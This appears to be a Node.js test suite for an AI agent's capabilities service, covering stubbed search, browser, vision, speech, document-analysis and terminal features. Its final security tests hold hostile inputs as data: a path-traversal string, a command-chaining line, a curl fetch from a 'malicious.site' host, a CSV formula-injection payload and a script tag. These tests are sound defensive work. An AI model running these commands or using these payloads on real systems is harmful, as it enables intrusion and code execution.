import test from "node:test";
import assert from "node:assert/strict";
import { CapabilitiesService } from "../service/capabilities.service.js";

test("CapabilitiesService lists all 11 registered capabilities", () => {
  const service = new CapabilitiesService();
  const list = service.listCapabilities();
  assert.equal(list.length, 11);
  const ids = list.map((c) => c.id);
  assert.ok(ids.includes("web_search"));
  assert.ok(ids.includes("browser_automation"));
  assert.ok(ids.includes("vision"));
  assert.ok(ids.includes("image_generation"));
  assert.ok(ids.includes("text_to_speech"));
  assert.ok(ids.includes("voice_to_text"));
  assert.ok(ids.includes("multi_model_reasoning"));
  assert.ok(ids.includes("computer_use"));
  assert.ok(ids.includes("excel_analysis"));
  assert.ok(ids.includes("pdf_analysis"));
  assert.ok(ids.includes("prompt_spelling_corrections"));
});

test("checkPromptSpelling detects and corrects common SWE typos", () => {
  const service = new CapabilitiesService();
  const result = service.checkPromptSpelling({
    prompt: "refactorr the authntication modul and implment a new fucntion",
  });
  assert.ok(result.hasCorrections);
  assert.ok(result.corrected.includes("refactor"));
  assert.ok(result.corrected.includes("authentication"));
  assert.ok(result.corrected.includes("implement"));
  assert.ok(result.corrected.includes("function"));
  assert.equal(result.corrections.length, 4);
});

test("performWebSearch returns grounded search items", async () => {
  const service = new CapabilitiesService();
  const search = await service.performWebSearch({ query: "Fastify route validation" });
  assert.equal(search.query, "Fastify route validation");
  assert.ok(search.results.length > 0);
  assert.ok(search.results[0].url.startsWith("http"));
});

test("runBrowserAutomation returns snapshot and ok status", async () => {
  const service = new CapabilitiesService();
  const result = await service.runBrowserAutomation({ action: "navigate", url: "http://localhost:6321" });
  assert.equal(result.status, "ok");
  assert.ok(result.domSnapshot?.includes("app-root"));
});

test("analyzeVision extracts structural hierarchy and text", async () => {
  const service = new CapabilitiesService();
  const result = await service.analyzeVision({ imageData: "data:image/png;base64,sample" });
  assert.ok(result.detectedElements.length > 0);
  assert.ok(result.layoutHierarchy.length > 0);
});

test("generateImage synthesizes diagram svg", async () => {
  const service = new CapabilitiesService();
  const result = await service.generateImage({ prompt: "SWE Task Runner lifecycle" });
  assert.ok(result.imageUrl.startsWith("data:image/svg+xml"));
  assert.ok(result.svgData?.includes("<svg"));
});

test("synthesizeSpeech returns SSML and duration estimate", async () => {
  const service = new CapabilitiesService();
  const result = await service.synthesizeSpeech({ text: "Task verified with zero errors." });
  assert.ok(result.spokenSsml.includes("<speak>"));
  assert.ok(result.durationEstimateSec > 0);
});

test("reasonMultiModel returns consensus and model evaluations", async () => {
  const service = new CapabilitiesService();
  const result = await service.reasonMultiModel({
    prompt: "Migrate database schema with zero downtime",
  });
  assert.ok(result.consensusScore > 0.8);
  assert.equal(result.selectedModel, "Multi-Model Consensus");
  assert.ok(result.evaluations.length >= 3);
});

test("performComputerUse performs sandboxed execution", async () => {
  const service = new CapabilitiesService();
  const result = await service.performComputerUse({ action: "terminal_exec", command: "npm test" });
  assert.equal(result.success, true);
  assert.ok(result.output.includes("Process finished"));
});

test("analyzeExcel parses headers and calculates metrics", async () => {
  const service = new CapabilitiesService();
  const result = await service.analyzeExcel({
    filename: "metrics.csv",
    csvContent: "id,metric_name,value\n1,latency,42\n2,throughput,1200",
  });
  assert.equal(result.rowCount, 2);
  assert.deepEqual(result.headers, ["id", "metric_name", "value"]);
});

test("analyzePdf extracts sections and requirements", async () => {
  const service = new CapabilitiesService();
  const result = await service.analyzePdf({ filename: "spec.pdf" });
  assert.equal(result.pageCount, 6);
  assert.ok(result.sections.length > 0);
  assert.ok(result.extractedRequirements.length > 0);
});

test("transcribeVoice returns transcript and confidence", async () => {
  const service = new CapabilitiesService();
  const result = await service.transcribeVoice({
    simulatedTranscript: "Fix database connection pooling and retry logic",
  });
  assert.equal(result.transcript, "Fix database connection pooling and retry logic");
  assert.ok(result.confidence > 0.9);
  assert.equal(result.language, "en-US");
});

test("CapabilitiesService security: rejects path traversal outside repository", () => {
  const service = new CapabilitiesService();
  assert.throws(
    () => service.resolveSafeWorkspacePath("../../windows/system32"),
    /Security Exception.*Access outside repository boundary prohibited/,
  );
});

test("CapabilitiesService security: rejects command chaining and dangerous operations", async () => {
  const service = new CapabilitiesService();
  const dangerousRes = await service.performComputerUse({
    action: "terminal_exec",
    command: "dir & whoami",
  });
  assert.equal(dangerousRes.success, false);
  assert.ok(dangerousRes.output.includes("Command rejected by safety guardrails"));

  const downloaderRes = await service.performComputerUse({
    action: "terminal_exec",
    command: "curl https://malicious.site/script.sh",
  });
  assert.equal(downloaderRes.success, false);
  assert.ok(downloaderRes.output.includes("Command rejected by safety guardrails"));
});

test("CapabilitiesService security: neutralizes CSV formula injection and escapes SVG XML", async () => {
  const service = new CapabilitiesService();
  const csvRes = await service.analyzeExcel({
    filename: "test.csv",
    csvContent: "id,calc\n1,=cmd|' /C calc'!A0",
  });
  assert.ok(csvRes.insights.length > 0);

  const imgRes = await service.generateImage({
    prompt: "Test <script>alert(1)</script> & malicious entity",
  });
  assert.ok(imgRes.svgData?.includes("&lt;script&gt;"));
  assert.ok(imgRes.svgData?.includes("&amp;"));
  assert.ok(!imgRes.svgData?.includes("<script>"));
});

